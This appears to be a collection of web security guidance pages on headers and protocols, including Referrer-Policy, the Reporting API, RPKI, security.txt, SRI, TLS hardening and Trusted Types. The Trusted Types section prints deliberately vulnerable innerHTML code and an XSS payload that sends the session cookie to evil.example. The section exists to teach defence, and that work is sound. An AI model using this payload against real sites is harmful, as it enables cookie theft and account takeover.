Permissions-Policy: fullscreen=(self "https://player.vimeo.com"), autoplay=(self "https://player.vimeo.com")
```

You can also constrain a single iframe with the `allow` attribute:

```html
<iframe src="https://player.vimeo.com/video/123" allow="fullscreen; autoplay"></iframe>
```

The iframe's effective permissions are the intersection of the page policy and the `allow` attribute.

## Common mistakes

- **Using the older `Feature-Policy` syntax.** Permissions-Policy uses structured headers with `()` lists, not space-separated origins.
- **Forgetting to allow features you actually use.** If `camera=()` is set, your own WebRTC code stops working.
- **Allowing `*` to "fix" a broken iframe.** Narrow it to the specific origin instead.
- **Setting the header on the API but not the HTML.** Only the top-level HTML response counts.

## Verification

- `curl -sI https://example.com | grep -i permissions-policy` should print the header.
- Visit [permissionspolicy.com](https://permissionspolicy.com/) or use Chrome DevTools → Application → Frames → Permissions Policy to see the effective policy.
- Try `navigator.mediaDevices.getUserMedia({camera: true})` from the console on a page where camera is denied — it should reject with a permissions error.
- Audit embedded iframes; check that their `allow` attributes match what they actually need.
---

## referrer-policy
Source: https://specification.website/spec/security/referrer-policy/

---
title: "Referrer-Policy"
category: security
status: recommended
url: https://specification.website/spec/security/referrer-policy/
updated: "2026-05-29T09:13:20.000Z"
sources:
  - title: "Referrer Policy (W3C Editor's Draft)"
    url: "https://www.w3.org/TR/referrer-policy/"
    publisher: "W3C"
  - title: "MDN — Referrer-Policy"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy"
    publisher: "MDN"
  - title: "web.dev — A new default Referrer-Policy for Chrome"
    url: "https://web.dev/articles/referrer-best-practices"
    publisher: "web.dev"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Referrer-Policy

> Referrer-Policy controls how much URL information your site leaks when users follow a link or load a subresource. strict-origin-when-cross-origin is the sensible default.

## What it is

When a browser navigates from one page to another, or loads an image, script, or fetch, it normally sends the URL of the originating page in the `Referer` header. `Referrer-Policy` lets you control exactly how much of that URL is shared, per response.

```http
Referrer-Policy: strict-origin-when-cross-origin
```

The header is defined by the W3C Referrer Policy specification. Modern Chrome, Edge, Firefox, and Safari use `strict-origin-when-cross-origin` as the default when none is set.

## Why it matters

URLs leak. A path like `/account/reset?token=abc123` or `/internal/customers/4711/edit` should never end up in the access logs of an unrelated third party. Without a referrer policy, every outbound link and every third-party subresource carries the full URL of the page the user was on.

A sensible policy keeps internal URLs internal, hands cross-site requests only the origin (`https://example.com`), and gives partners and analytics tools enough context to be useful without exposing path or query parameters.

## How to implement

Send the header on every HTML response. The recommended baseline is the modern browser default:

```http
Referrer-Policy: strict-origin-when-cross-origin
```

This sends the full URL on same-origin requests, only the origin on cross-origin requests over HTTPS, and nothing at all on HTTPS-to-HTTP downgrades.

Available values, from most permissive to most restrictive:

- **`unsafe-url`** — always sends the full URL. Avoid.
- **`no-referrer-when-downgrade`** — legacy default. Sends the full URL except on HTTPS-to-HTTP.
- **`origin`** — always sends just the origin.
- **`origin-when-cross-origin`** — full URL same-origin, origin cross-origin.
- **`same-origin`** — full URL same-origin, nothing cross-origin.
- **`strict-origin`** — origin only, never on downgrades.
- **`strict-origin-when-cross-origin`** — recommended default.
- **`no-referrer`** — never send the header.

You can also override per element:

```html
<a href="https://partner.example.com" referrerpolicy="no-referrer">Partner</a>
<meta name="referrer" content="strict-origin-when-cross-origin">
```

Use a stricter policy (`same-origin` or `no-referrer`) on pages with sensitive URLs — password reset, account settings, internal tools.

## Common mistakes

- **Relying on the browser default.** Different browsers historically used different defaults. Be explicit.
- **Setting `no-referrer` site-wide.** Some partners legitimately need the origin to attribute traffic.
- **Forgetting per-page overrides.** A single `<meta name="referrer">` on a reset-password page is worth more than a generic header everywhere else.
- **Leaking tokens in URLs in the first place.** Referrer policy reduces blast radius — it does not fix the underlying mistake.

## Verification

- `curl -sI https://example.com | grep -i referrer-policy` should show the header.
- Open DevTools → Network, click an outbound request, and check the `Referer` value matches the policy.
- Audit the URLs of authenticated pages for tokens, IDs, or anything that would embarrass you in a partner's logs.
---

## reporting-endpoints
Source: https://specification.website/spec/security/reporting-endpoints/

---
title: "Reporting API (Reporting-Endpoints)"
category: security
status: recommended
url: https://specification.website/spec/security/reporting-endpoints/
updated: "2026-06-16T00:00:00.000Z"
sources:
  - title: "Reporting API"
    url: "https://w3c.github.io/reporting/"
    publisher: "W3C"
  - title: "MDN — Reporting-Endpoints header"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints"
    publisher: "MDN"
  - title: "MDN — Reporting API"
    url: "https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API"
    publisher: "MDN"
  - title: "Monitor your web application with the Reporting API"
    url: "https://developer.chrome.com/docs/capabilities/web-apis/reporting-api"
    publisher: "Chrome for Developers"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Reporting API (Reporting-Endpoints)

> A response header that names HTTP endpoints to which the browser POSTs structured violation reports — CSP and COOP breaches, permissions-policy violations, deprecations, interventions, and crashes — so you learn what is breaking in the field.

## What it is

The **Reporting API** is a W3C standard that lets a site collect structured reports the browser generates while rendering a page — things the user never sees and that rarely surface in server logs. You declare named endpoints with the `Reporting-Endpoints` response header, and the browser POSTs batched JSON reports to them.

```http
Reporting-Endpoints: default="https://example.com/reports", csp-endpoint="https://example.com/csp"
```

Each name maps to a URL. Other headers then reference a name: a Content Security Policy points its `report-to` directive at one endpoint, while reports that have no header of their own — deprecations, browser interventions, and crashes — go to the endpoint named `default`.

The Reporting API supersedes the older, never-standardised `Report-To` header and the CSP-only `report-uri` directive. `Reporting-Endpoints` uses a simpler structured-header syntax and is the form to use today.

## Why it matters

A strict Content Security Policy, cross-origin isolation, or a tight Permissions-Policy can break a page in ways that are invisible from the server: a blocked inline script, a third-party widget that no longer loads, an embed that violates COOP. Without reporting, you discover these only when a user complains. With a reporting endpoint wired up, the browser tells you the moment a real visitor hits the problem — which directive fired, on which URL, from which source.

It is also the only channel for several report types that exist nowhere else: **deprecation** reports warn you that an API your site depends on is being removed from browsers, and **crash** and **intervention** reports tell you when the browser killed or throttled your page. That turns a strict policy from a deploy-and-pray gamble into something you can roll out behind report-only mode, watch, and tighten with evidence.

This site ships `Reporting-Endpoints: csp-endpoint="/reports", default="/reports"` and wires its Content Security Policy to it with `report-to csp-endpoint` — see [`public/_headers`](https://github.com/jdevalk/specification.website/blob/main/public/_headers). A small same-origin collector ([`functions/reports.ts`](https://github.com/jdevalk/specification.website/blob/main/functions/reports.ts)) records the aggregate report type, path, and directive — no IP address, no cookies, no URL query strings.

## How to implement

1. Send `Reporting-Endpoints` on HTML responses, naming at least a `default` endpoint and any policy-specific ones you need.
2. Point each policy at its endpoint — e.g. add `report-to csp-endpoint` to your CSP, and ship it first as `Content-Security-Policy-Report-Only` so violations are reported without blocking.
3. Stand up a collector that accepts `POST` with `Content-Type: application/reports+json` and stores the batched array of reports.
4. Watch the stream, fix the genuine violations, then switch the policy from report-only to enforcing.

## Common mistakes

- **Using the deprecated `Report-To` header or CSP `report-uri`.** Migrate to `Reporting-Endpoints` plus `report-to`.
- **Forgetting the `default` endpoint.** Deprecation, intervention, and crash reports have no directive of their own and are silently dropped without it.
- **Expecting reports cross-origin without CORS.** A collector on another origin must answer the browser's preflight.
- **Enforcing a new policy before reading its reports.** Run report-only first.

## Verification

- `curl -sI https://example.com | grep -i reporting-endpoints` confirms the header is present and well-formed.
- Trigger a deliberate CSP violation in DevTools and confirm a `POST` arrives at your collector with a `csp-violation` report body.
- Check the **Application → Reporting API** panel (Chromium) to see queued and delivered reports per document.
---

## rpki
Source: https://specification.website/spec/security/rpki/

---
title: "RPKI route origin validation"
category: security
status: recommended
url: https://specification.website/spec/security/rpki/
updated: "2026-10-15T00:00:00.000Z"
sources:
  - title: "RFC 6480 — An Infrastructure to Support Secure Internet Routing"
    url: "https://www.rfc-editor.org/rfc/rfc6480"
    publisher: "IETF"
  - title: "RFC 6811 — BGP Prefix Origin Validation"
    url: "https://www.rfc-editor.org/rfc/rfc6811"
    publisher: "IETF"
  - title: "RFC 9582 — A Profile for Route Origin Authorizations (ROAs)"
    url: "https://www.rfc-editor.org/rfc/rfc9582"
    publisher: "IETF"
  - title: "RFC 9319 (BCP 185) — The Use of maxLength in the Resource Public Key Infrastructure (RPKI)"
    url: "https://www.rfc-editor.org/rfc/rfc9319"
    publisher: "IETF"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# RPKI route origin validation

> Make sure the IP prefixes your web, name and mail servers live in are covered by Route Origin Authorisations, so networks that validate routes can reject hijacked announcements. Usually that means choosing a host that signs them.

## What it is

Traffic finds its way across the internet through BGP, the protocol networks use to announce which IP prefixes they can deliver to. Plain BGP believes whatever it is told: if a network announces a prefix it does not hold, by mistake or on purpose, traffic for that prefix can be pulled towards it. That is a route hijack, and it has repeatedly taken popular sites offline or redirected their traffic.

The Resource Public Key Infrastructure (RPKI, RFC 6480) lets the holder of an address block publish a signed statement, a Route Origin Authorisation (ROA, RFC 9582), saying which network (identified by its Autonomous System Number, or ASN) may originate a prefix, and how specific an announcement may be. Networks that perform route origin validation (RFC 6811) check each announcement against the published ROAs and label it:

- **Valid**: a ROA covers the prefix and the origin ASN matches.
- **Invalid**: a ROA covers the prefix, but the origin ASN or the prefix length does not match. Validating networks drop these.
- **Not found**: no ROA covers the prefix. It is accepted, unprotected.

The misconception worth correcting is that RPKI is something you configure on your website or in your DNS zone. It is not. A ROA is issued by whoever holds the IP address space, through their regional internet registry (RIPE NCC, ARIN, APNIC, LACNIC, AFRINIC). Most site owners rent addresses from a host or CDN and hold no address space at all, so they cannot sign anything themselves. What they control is the choice of host.

## Why it matters

A hijacked prefix can black-hole a site, or deliver its visitors to someone else's server. TLS limits the damage when it works, since an attacker without your certificate cannot impersonate an HTTPS site, but a hijack can still take the site offline, intercept plain DNS and SMTP, and in some cases help an attacker pass the domain validation a certificate authority performs.

ROAs only help if two things are true: the prefix has a ROA, and the networks between your visitors and your server validate. Validation is now widespread among large transit providers and access networks, so the remaining gap is mostly on the publishing side. A prefix with no ROA gets no protection from any of that validation.

This applies to every server your domain depends on, not just the web server: the authoritative name servers and the mail servers named in your `MX` records each sit in some prefix, and each prefix should be covered.

## How to implement

**If you rent hosting, DNS, or mail service** (the usual case):

1. Find the prefixes your servers sit in. Look up each `A` and `AAAA` address for the site, the name servers, and the `MX` hosts in a routing lookup such as [RIPEstat](https://stat.ripe.net/).
2. Check their RPKI status in the same tool. You want **valid** for every one.
3. If a prefix is not found or invalid, ask the provider to sign ROAs for it. Treat RPKI coverage as a selection criterion when choosing a host, DNS provider, or mail provider; the large ones all sign.

**If you hold your own address space and announce it yourself:**

1. Create ROAs in your regional internet registry's portal (or run a delegated RPKI certificate authority) for every prefix you announce, naming the ASN that originates it.
2. Make each ROA match what you actually announce. RFC 9319 recommends setting `maxLength` no longer than the prefix itself, and listing each more-specific prefix explicitly, rather than authorising every possible sub-prefix with a liberal `maxLength`. A loose ROA lets a hijacker announce a more-specific prefix with your ASN as the forged origin and still be judged valid.
3. Create ROAs before you change origins. When moving a prefix to a new upstream or a DDoS-mitigation provider, publish the ROA for the new ASN first, or validating networks will drop the new announcement as invalid.
4. Validate routes you receive, too, if you run BGP: drop invalids.

This site ships it through its host: the prefixes Cloudflare announces for this site and its name servers are covered by ROAs for Cloudflare's ASN and validate as valid.

## Common mistakes

- **Assuming the site's TLS or DNSSEC covers routing.** They protect different layers; neither says anything about who may announce a prefix.
- **Checking only the web server.** The name servers and mail servers are in other prefixes, often run by other providers.
- **A ROA whose length does not cover the announcement.** A ROA for a `/44` with `maxLength` 44 makes a `/48` announced from inside it invalid under that ROA. Either publish a ROA for the `/48` or set the length to match, and prefer the explicit ROA.
- **Moving a prefix to a new network without updating the ROA**, so the new announcement is invalid and validating networks drop it.
- **Letting RPKI certificates or ROAs lapse** in a self-hosted RPKI setup. Expired objects turn valid routes into not found, or worse.

## Verification

- Look up each server address on [RIPEstat](https://stat.ripe.net/) and check the RPKI validation status of the announcing prefix and origin ASN.
- Cloudflare's public RPKI test at [isbgpsafeyet.com](https://isbgpsafeyet.com/) checks whether your own access network validates, which is the other half of the system.
- Run the [Internet.nl website test](https://internet.nl/) (and the email test for mail servers). Its RPKI section checks that a ROA exists for each server's prefix and that the announcement is valid.
---

## security-txt
Source: https://specification.website/spec/security/security-txt/

---
title: "/.well-known/security.txt"
category: security
status: recommended
url: https://specification.website/spec/security/security-txt/
updated: "2026-06-08T12:00:00.000Z"
sources:
  - title: "RFC 9116 — A File Format to Aid in Security Vulnerability Disclosure"
    url: "https://www.rfc-editor.org/rfc/rfc9116"
    publisher: "IETF"
  - title: "securitytxt.org"
    url: "https://securitytxt.org/"
    publisher: "securitytxt.org"
  - title: "RFC 8615 — Well-Known Uniform Resource Identifiers (URIs)"
    url: "https://www.rfc-editor.org/rfc/rfc8615"
    publisher: "IETF"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# /.well-known/security.txt

> A standard text file at /.well-known/security.txt tells security researchers how to report vulnerabilities. It is cheap to publish and dramatically lowers the bar for responsible disclosure.

## What it is

`security.txt` is a plain-text file served at `/.well-known/security.txt` that lists the contact methods, policy URL, and encryption keys a security researcher should use to report a vulnerability in your site. It is defined by RFC 9116.

```http
GET /.well-known/security.txt HTTP/1.1
Host: example.com
```

A minimal file:

```
Contact: mailto:security@example.com
Expires: 2027-01-01T00:00:00Z
```

## Why it matters

When a researcher finds a vulnerability, the first question is "who do I tell?". Without a known address, reports go to `info@`, get lost in support queues, or — worse — get posted publicly because no one answered. `security.txt` removes the guesswork. It is the security equivalent of `robots.txt`: a small, standard, machine-readable file in a known location.

Bug-bounty platforms, automated scanners, and security teams check for it. Publishing one signals that you take reports seriously, and many researchers will not bother with a site that has no clear contact.

## How to implement

Create the file at `/.well-known/security.txt`. Serve it over HTTPS with `Content-Type: text/plain; charset=utf-8`. RFC 9116 fields:

- **`Contact:`** — required. One or more `mailto:`, `https:`, or `tel:` URIs. Use a monitored mailbox or form.
- **`Expires:`** — required. ISO 8601 timestamp. Set it to roughly a year out and update it before it lapses.
- **`Encryption:`** — optional. URL to a PGP key for encrypted reports.
- **`Preferred-Languages:`** — optional. Comma-separated BCP 47 tags.
- **`Canonical:`** — optional. The canonical HTTPS URL of the file itself; helps when the file is mirrored.
- **`Policy:`** — optional. URL to your responsible-disclosure or bug-bounty policy.
- **`Acknowledgments:`** — optional. URL to a hall of fame.
- **`Hiring:`** — optional. URL to security-team job listings.

Full example:

```
Contact: mailto:security@example.com
Contact: https://example.com/security/report
Expires: 2027-05-29T00:00:00Z
Encryption: https://example.com/.well-known/pgp-key.txt
Preferred-Languages: en, nl
Canonical: https://example.com/.well-known/security.txt
Policy: https://example.com/security/policy
```

RFC 9116 allows the file to be cryptographically signed with an inline PGP signature. Useful for high-trust environments, optional for most sites.

## Common mistakes

- **No `Expires:`.** The file is invalid per RFC 9116 without it.
- **Letting `Expires:` lapse.** Treat it like a certificate. Calendar reminder, automated check, or both.
- **Pointing `Contact:` at an unmonitored address.** Worse than no file at all.
- **Serving the file from `/security.txt` instead of `/.well-known/security.txt`.** RFC 9116 says the well-known path is canonical.

## Verification

- `curl -s https://example.com/.well-known/security.txt` should return the file.
- The response must be `200` and `Content-Type: text/plain`.
- Parse it with the validator at [securitytxt.org](https://securitytxt.org/).
- Check the `Expires:` date in your monitoring.
---

## subresource-integrity
Source: https://specification.website/spec/security/subresource-integrity/

---
title: "Subresource Integrity (SRI)"
category: security
status: recommended
url: https://specification.website/spec/security/subresource-integrity/
updated: "2026-07-02T00:00:00.000Z"
sources:
  - title: "Subresource Integrity (W3C Working Draft)"
    url: "https://www.w3.org/TR/SRI/"
    publisher: "W3C"
  - title: "Subresource Integrity — §3.8 Integrity-Policy (W3C Editor's Draft)"
    url: "https://w3c.github.io/webappsec-subresource-integrity/#integrity-policy-section"
    publisher: "W3C"
  - title: "MDN — Integrity-Policy header"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Integrity-Policy"
    publisher: "MDN"
  - title: "OWASP — Third Party JavaScript Management Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Subresource Integrity (SRI)

> SRI adds a cryptographic hash to every third-party script and stylesheet so the browser refuses to run modified files. Essential for any external JS or CSS you depend on.

## What it is

Subresource Integrity is a W3C standard that lets you pin the exact content of a script or stylesheet. You include a cryptographic hash of the file in the `integrity` attribute, and the browser refuses to execute the resource if the hash does not match.

```html
<script
  src="https://cdn.example.com/widget.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

SRI applies to `<script>` and `<link rel="stylesheet">`, and also `<link rel="preload">` and `<link rel="modulepreload">`.

## Why it matters

Every external script you load runs with full access to your origin. If the CDN is compromised, if an attacker buys an abandoned npm package, or if a CDN ops mistake swaps a file, that script can read cookies, exfiltrate form data, and rewrite the DOM. SRI shifts trust from "the CDN is currently honest" to "the file is byte-for-byte the one we audited".

This is the standard defence against the kind of supply-chain attack that hit Magecart, Polyfill.io, and Event-Stream. CSP can restrict which hosts you trust; SRI restricts which specific files you trust on those hosts.

## How to implement

For every external script or stylesheet, compute a SHA-384 hash of the exact file content and include it in the `integrity` attribute. Add `crossorigin="anonymous"` so the browser sends a CORS request and can verify the response without credentials.

```html
<link
  rel="stylesheet"
  href="https://cdn.example.com/styles.css"
  integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
  crossorigin="anonymous"
>
```

Generate the hash on the command line:

```
curl -s https://cdn.example.com/widget.js | openssl dgst -sha384 -binary | openssl base64 -A
```

SRI supports `sha256`, `sha384`, and `sha512`. SHA-384 is the recommended default. You may list multiple hashes separated by spaces; the browser passes the resource if any one matches — useful for a graceful version rollover.

Pair SRI with a strict CSP. CSP says "only load scripts from these hosts"; SRI says "and only this exact file from that host".

## Enforce it site-wide with Integrity-Policy

A per-element `integrity` attribute is easy to forget on the next script someone adds. The `Integrity-Policy` response header closes that gap: it tells the browser to block any script (or, behind a flag, stylesheet) that loads without integrity metadata, so a missing hash fails loudly instead of silently. It also blocks any script requested in `no-cors` mode, so every `<script>` the policy governs — including same-origin ones — needs a `crossorigin` attribute alongside `integrity`, or it is blocked even when its hash is correct.

```
Integrity-Policy: blocked-destinations=(script)
Integrity-Policy-Report-Only: blocked-destinations=(script), endpoints=(integrity-endpoint)
```

Start in report-only mode. `Integrity-Policy-Report-Only` enforces nothing but sends an `IntegrityViolationReport` to a named [Reporting API](/spec/security/reporting-endpoints/) endpoint for every resource that _would_ be blocked, so you can find un-hashed scripts before you turn enforcement on. The header is supported across Chromium, Firefox, and Safari, though Firefox currently logs violations to the console rather than delivering them to the endpoint.

This site ships `Integrity-Policy-Report-Only: blocked-destinations=(script)` (see its `_headers`) as a regression tripwire: every first-party script carries integrity — computed at build time — so a clean report stream is the signal that enforcing `Integrity-Policy` is safe. Because a script served from a mutable third-party URL cannot be pinned, the analytics loader here is self-hosted as a frozen, hashed copy (refreshed daily) rather than loaded live; anything you truly cannot pin must be dropped before you enforce.

## Common mistakes

- **Forgetting `crossorigin="anonymous"`.** Without it, the browser silently refuses to validate the integrity and the script is blocked.
- **Pinning to a "latest" CDN URL.** The hash and the URL must match a specific immutable version. Use `/widget@1.2.3/widget.js`, never `/widget/widget.js`.
- **Updating the script but not the hash.** The page breaks. Automate hash generation in your build.
- **Using SRI on first-party assets you already control.** It is harmless but not the highest-value place to spend the effort; reserve attention for third parties.

## Verification

- View source. Every `<script src="https://…">` and external `<link rel="stylesheet">` should have an `integrity` and `crossorigin` attribute.
- Tamper with a byte of the file (via a local proxy) and confirm the browser refuses to run it; the console reports "Failed to find a valid digest".
- Use a tool like [SRI Hash Generator](https://srihash.org/) to compute hashes for ad-hoc checks.
- Audit dependency upgrades: any time a third-party file URL changes, the hash must change with it.
---

## tls-configuration
Source: https://specification.website/spec/security/tls-configuration/

---
title: "TLS configuration hardening"
category: security
status: recommended
url: https://specification.website/spec/security/tls-configuration/
updated: "2026-10-15T00:00:00.000Z"
sources:
  - title: "RFC 9325 (BCP 195) — Recommendations for Secure Use of Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS)"
    url: "https://www.rfc-editor.org/rfc/rfc9325"
    publisher: "IETF"
  - title: "RFC 5746 — Transport Layer Security (TLS) Renegotiation Indication Extension"
    url: "https://www.rfc-editor.org/rfc/rfc5746"
    publisher: "IETF"
  - title: "RFC 9846 — The Transport Layer Security (TLS) Protocol Version 1.3"
    url: "https://www.rfc-editor.org/rfc/rfc9846"
    publisher: "IETF"
  - title: "RFC 8470 — Using Early Data in HTTP"
    url: "https://www.rfc-editor.org/rfc/rfc8470"
    publisher: "IETF"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# TLS configuration hardening

> Beyond protocol versions and key exchange: TLS compression off, secure renegotiation only, no unsafe 0-RTT, Extended Main Secret on, server cipher order, SHA-2 signatures, and certificate keys of adequate size.

## What it is

[HTTPS and TLS](/spec/security/https-tls/) covers the decisions that matter most: TLS 1.2 and 1.3 only, ECDHE key exchange, hybrid post-quantum key agreement, a complete certificate chain. This page is the rest of the checklist: the parameters that tools such as Internet.nl and SSL Labs test one by one, each closing a specific, named attack.

Most of these settings only matter for TLS 1.2. TLS 1.3 removed compression and renegotiation, always binds the session to the full handshake, and only defines strong cipher suites, so a TLS 1.3-only server passes most of this list by construction. The reason the list still exists is that nearly every public site keeps TLS 1.2 enabled for older clients, and the TLS 1.2 side of the configuration is where the old defaults survive.

## Why it matters

Each item below corresponds to an attack that worked against real deployments: CRIME against TLS compression, the 2009 renegotiation injection attack, the triple-handshake attack, replay of early data, and signature forgery against weak hashes. A server that negotiates TLS 1.3 with a current browser is not exposed to most of them, but an attacker chooses the weakest protocol version the server will accept, not the one a typical visitor gets.

## How to implement

Start from the Mozilla SSL Configuration Generator's "Intermediate" profile, which covers most of this list, then check each item against your server, since older server versions and hand-edited configurations drift.

- **TLS compression off.** TLS-level compression leaks the contents of encrypted records through their length, which the CRIME attack used to recover session cookies. RFC 9325 says deployments **SHOULD NOT** support it. TLS 1.3 removed it entirely. This is separate from HTTP compression; see [compression](/spec/performance/compression/) for the related BREACH caveat.
- **Secure renegotiation on, client-initiated renegotiation off.** TLS 1.2 servers must support the `renegotiation_info` extension (RFC 5746), which fixes the 2009 plaintext injection attack; RFC 9325 makes it a **MUST**. Separately, disable renegotiation initiated by the client: it gives nothing to a website and lets a single client force repeated expensive handshakes, a cheap denial-of-service lever. TLS 1.3 has no renegotiation at all.
- **0-RTT off, or only for replay-safe requests.** TLS 1.3 early data (0-RTT) lets a returning client send its first request before the handshake finishes, but that data can be replayed by an attacker (RFC 9846, section 8). RFC 9325 says not to use it unless the application profile makes replay safe. For HTTP, RFC 8470 is that profile: only accept idempotent requests such as `GET` in early data, mark them with the `Early-Data: 1` header towards the origin, and answer `425 Too Early` for anything that changes state. If you cannot enforce that, leave 0-RTT off.
- **Extended Main Secret on (TLS 1.2).** The extension originally specified as "Extended Master Secret" (RFC 7627) binds the session keys to the whole handshake transcript, defeating the triple-handshake attack. RFC 9325 makes support a **MUST** for TLS 1.2. RFC 9846 renamed it "Extended Main Secret" and obsoleted RFC 7627 without changing how it works, so tools may use either name.
- **Server cipher order on TLS 1.2, or only strong suites.** If the server offers a mix of strong and weaker suites, configure it to choose from its own preference list rather than the client's, with AEAD suites (`AES-GCM`, `ChaCha20-Poly1305`) over `ECDHE` first; otherwise an old or misconfigured client can steer the connection to the weakest suite you allow. The alternative is to offer only strong suites, in which case the order no longer matters. That is the approach the Mozilla "Intermediate" profile takes: it turns server preference off because every suite it lists is strong, and Internet.nl accepts that too. On TLS 1.3 every defined suite is strong, so the same reasoning applies.
- **SHA-2 for the key-exchange signature.** In TLS 1.2 the server signs its key exchange parameters, and the hash for that signature is negotiated. SHA-1 and MD5 there **MUST NOT** be used (RFC 9155, cited by RFC 9325); offer SHA-256 or stronger only.
- **Certificate key of adequate size.** RSA keys of at least 2048 bits (RFC 9325 requires this), or ECDSA on P-256 or a larger curve. ECDSA P-256 is smaller and faster; many sites serve both an ECDSA and an RSA certificate and let the client choose.
- **Certificate signed with SHA-256 or stronger.** Publicly trusted CAs no longer issue SHA-1-signed certificates, so this mostly catches internal CAs, very old certificates, and SHA-1 intermediates left in a chain.

This site inherits these settings rather than configuring them: TLS is terminated by its CDN, Cloudflare, so its handshake parameters are the CDN's.

## Common mistakes

- **Copying a TLS configuration from before TLS 1.3** that never disabled compression or client renegotiation because the server's defaults at the time did not.
- **Enabling 0-RTT at the CDN for an application that accepts `POST` requests**, without the origin checking `Early-Data` or returning `425`.
- **Fixing the leaf certificate and forgetting the chain.** A SHA-256 leaf served with a SHA-1 intermediate still fails the signature check.
- **Assuming a good score with a modern browser means the TLS 1.2 side is fine.** Test the server, not one client's view of it.

## Verification

- The [Internet.nl website test](https://internet.nl/) checks each item in its HTTPS section: TLS compression, secure and client-initiated renegotiation, 0-RTT, cipher order, key-exchange hash function, certificate public key, certificate signature and Extended Master Secret.
- [Qualys SSL Labs](https://www.ssllabs.com/ssltest/) reports the same parameters, with the handshake each simulated client would get.
- `openssl s_client -connect example.com:443 -tls1_2` shows the negotiated suite and, on recent OpenSSL, whether Extended Master Secret was used.
---

## trusted-types
Source: https://specification.website/spec/security/trusted-types/

---
title: "Trusted Types"
category: security
status: recommended
url: https://specification.website/spec/security/trusted-types/
updated: "2026-06-23T10:00:00.000Z"
sources:
  - title: "Trusted Types (W3C Working Draft)"
    url: "https://www.w3.org/TR/trusted-types/"
    publisher: "W3C"
  - title: "MDN — Trusted Types API"
    url: "https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API"
    publisher: "MDN"
  - title: "MDN — Content-Security-Policy: require-trusted-types-for"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for"
    publisher: "MDN"
  - title: "OWASP — DOM based XSS Prevention Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Trusted Types

> Trusted Types make the browser reject plain strings at DOM injection sinks like innerHTML, demanding a vetted typed value instead. Switched on with two CSP directives, it neutralises a whole class of DOM-based XSS.

## What it is

Trusted Types is a browser mechanism that blocks DOM-based cross-site scripting at the point of injection. DOM XSS happens when an attacker-controlled string reaches a dangerous "sink" — `innerHTML`, `outerHTML`, `document.write()`, `eval()`, or a script element's `src`. Trusted Types makes the browser refuse a plain string at those sinks and demand a non-spoofable typed value (`TrustedHTML`, `TrustedScript`, or `TrustedScriptURL`) produced by a policy you define and control. You enable it with two Content Security Policy directives:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape
```

It reached [Baseline](https://web.dev/baseline) in February 2026 — Chrome and Edge have shipped it since 2020, Safari since version 26, and Firefox completed the set.

## Why it matters

A nonce-based [CSP](/spec/security/content-security-policy/) stops an attacker injecting or running a new external script, but DOM XSS needs no new script element: it abuses code already on the page that writes untrusted input into a sink. Take a search widget that echoes the query from the URL:

```js
// Vulnerable: q comes straight from the address bar
const q = new URLSearchParams(location.search).get("q");
results.innerHTML = `<h2>Results for ${q}</h2>`;
```

A visitor sent to `?q=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` runs the attacker's script in your origin — the `onerror` handler fires the moment the broken image loads, and the session cookie leaves the building. No external script, no CSP `script-src` violation; a nonce never gets a look-in.

Trusted Types closes that gap. With `require-trusted-types-for 'script'` enforced, that `innerHTML` assignment throws a `TypeError` before the string ever reaches the parser, because `q` is a plain string and not a `TrustedHTML` value. To make the page work again you must route the value through a policy that sanitises it:

```js
const policy = trustedTypes.createPolicy("escape", {
  createHTML: (s) => DOMPurify.sanitize(s),
});
results.innerHTML = policy.createHTML(`<h2>Results for ${q}</h2>`);
```

The `<img onerror>` is now stripped before it lands. The win is structural: the question stops being "did every developer remember to sanitise every sink?" and becomes "does *any* sink receive an unsanitised string?" — and the browser answers that for you, everywhere, by throwing.

This covers more than `innerHTML`. The three trusted types guard the three families of script-execution sink:

- **`TrustedHTML`** — markup parsers: `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`, `<iframe srcdoc>`.
- **`TrustedScript`** — direct code execution: `eval()`, `new Function()`, inline event-handler properties, a `<script>` element's text.
- **`TrustedScriptURL`** — loading code by URL: `<script src>`, `Worker()`, `import()`.

Each turns "exploitable" into "throws before it executes".

## How to implement

1. **Deploy in report-only first** so you can find every sink your code touches without breaking the page:

   ```http
   Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types escape; report-to csp-endpoint
   ```

2. **Create a policy that sanitises** rather than passing input through untouched. A vetted sanitiser such as DOMPurify is the usual choice:

   ```js
   trustedTypes.createPolicy("escape", {
     createHTML: (input) => DOMPurify.sanitize(input),
   });
   ```

3. **Name the policies you allow** in the `trusted-types` directive — here, `escape`. One name is special: a policy called `default` is applied automatically wherever a sink expects a trusted value, which lets you retrofit a large codebase without editing every call site.
4. **Switch to enforcing** (`Content-Security-Policy`) once the report stream is clean.

## Common mistakes

- **A pass-through default policy** that returns its input unchanged — it satisfies the type check while re-opening the exact hole you closed.
